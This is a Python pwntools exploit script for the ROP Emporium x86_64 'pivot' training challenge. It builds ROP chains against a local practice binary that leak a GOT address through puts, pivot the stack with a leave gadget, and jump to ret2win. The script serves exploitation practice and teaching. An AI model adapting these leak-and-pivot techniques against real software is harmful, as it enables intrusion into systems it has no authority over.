#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Ropemporium x86_64 pivot
# Version with leak of the got calling puts

# pwnme+181 : leave
gs='''
b *pwnme
c
'''
# Offset avant ecrasement de l'adresse de RBP
offset=0x20

# Set up pwntools for the correct architecture
elf =  ELF('pivot')
context.binary=elf
context.log_level='info'
context(terminal=['tmux', 'split-window', '-h'])

useless_func=elf.symbols['uselessFunction']
puts=elf.symbols['puts']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']
pwnme=elf.symbols['pwnme']

# References ELF de la librairie
libelf = ELF('libpivot.so')

# Calcul de la distance entre ret2win et foothold_function
lib_foothold = libelf.symbols['foothold_function']
lib_ret2win = libelf.symbols['ret2win']
off_ret2win=lib_ret2win-lib_foothold

# Gadgets
g_leave = pwnme+181
g_ret = pwnme+182
g_poprax=0x04009bb
g_poprbp=0x0400808
g_poprdi=0x0400a33
g_addrax=0x04009c4
g_callrax=0x04006b0
g_movraxrax=0x04009c0


if len(sys.argv)>1 and sys.argv[1] == "-d":
    #gdb.attach(io,gs)
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
leak = int(leak,16)
log.info(f"leak=0x{leak:x}")

io.info("----- First stage ------")
# Message 1
# Version leak with puts and replay pwnme
PL=p64(leak+0x200)     # for rbp
PL+=p64(plt_foothold)  # Call foothold to update the GOT
PL+=p64(g_poprdi)      # set got.foothold to rdi
PL+=p64(got_foothold)  # popped in rdi
PL+=p64(g_ret)         # alignment
PL+=p64(puts)          # send it
PL+=p64(g_poprdi)      # new arg for pwnme
PL+=p64(leak+0x80)     # for rdi (new address)
PL+=p64(pwnme)         # go back to pwnme

io.sendlineafter(b"> ",PL)

# Message 2 : pivot
PL2 =b"A"*offset
PL2+=p64(leak)   
PL2+=p64(g_leave)
io.sendlineafter(b"> ",PL2)

# Receive the leak of the foothold adresse
io.recvline()
rep = io.recvline().rstrip()
rep = io.recvline().rstrip()
if len(rep) != 6:
    info(rep.hex())
    error("Bad leak adresse length (prob zero in the address). retry plz ")
fh_leak=u64(rep+b"\x00\x00")
info(f"foothold leak=0x{fh_leak:x}")

io.info("----- Second stage ------")

info("Second stage first message...")
io.sendlineafter(b"> ",b"AAAA")
#io.sendline(b"AAAA")
info("Second stage pivot...")
PL3 =b"A"*offset
PL3+=p64(0xdeadbeef)
PL3+=p64(fh_leak+off_ret2win)
io.sendlineafter(b"> ",PL3)
print(PL3.hex())
#io.sendline(PL3)
io.interactive()

